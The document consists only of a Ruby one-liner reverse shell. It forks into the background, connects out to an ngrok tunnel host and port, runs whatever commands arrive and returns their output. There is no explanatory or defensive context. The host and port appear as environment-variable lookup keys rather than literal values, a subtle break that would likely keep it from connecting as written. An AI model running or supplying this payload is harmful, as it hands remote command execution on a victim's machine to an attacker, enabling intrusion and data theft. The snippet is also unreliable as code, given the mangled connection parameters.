ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["2.tcp.eu.ngrok.io"],ENV["17016"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
